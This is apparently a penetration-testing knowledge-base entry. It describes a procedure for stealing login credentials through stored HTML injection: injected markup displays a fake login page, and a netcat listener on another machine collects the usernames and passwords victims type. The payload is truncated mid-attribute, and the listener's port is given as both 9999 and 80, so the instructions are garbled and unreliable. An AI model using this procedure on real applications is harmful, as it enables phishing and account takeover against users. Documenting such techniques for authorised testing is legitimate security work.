---
id: 50c12a0c-002b-42ef-86a3-8e2e809257b2
name: HTML Injection Stored To Steal Credentials
type: procedure
verified: true
submitted: true
created_at: '2020-07-27T17:28:11.940127+00:00'
updated_at: '2023-05-26T01:27:30.233315+00:00'
platforms:
- Web
tags:
- '[[HTML Injection]]'
- '[[impersonation]]'
- '[[stored HTML injection]]'
- '[[Web Applications]]'
commands:
- '[[nc.exe -lvp 9999]]'
- '[[Netcat windows in listening mode on port 80]]'
---

# HTML Injection Stored To Steal Credentials

**Status**: ✓ Verified

## Summary

Stored HTML injection can be manipulated by an attacker to steal the credentials of an application. The attacker can maintain persistent access to application by impersonating the user with stolen credentials. 

## Description

# Description

Stored HTML injection can be manipulated by an attacker to steal the credentials of an application. The attacker can maintain persistent access to application by impersonating the user with stolen credentials.

# Instructions

1. place the payload in the text box as shown in the belwo image.

*Payload*

**Code**: [[<div class="code">test</div>
<div style="position:]]

2. Use *netcat *in a different machine in a listening mode  before submitting the request in step 1.

**Command** ([[nc.exe -lvp 9999]]):

```bash
nc.exe -lvp 9999
```

3. After the request is submitted in step 1, a login page with username and password impersonating the actual login page of the application is displayed .

4. A victim will enter the *username *and *password *assuming to be the actual login application . After *login i*s *clicked  , *observe the response* in nc *command window which is listening mode.  *Username *along with *password *can be observed as shown below.

## Platforms

- Web

## Commands Used

- [[nc.exe -lvp 9999]]
- [[Netcat windows in listening mode on port 80]]

## Tags

- [[HTML Injection]]
- [[impersonation]]
- [[stored HTML injection]]
- [[Web Applications]]
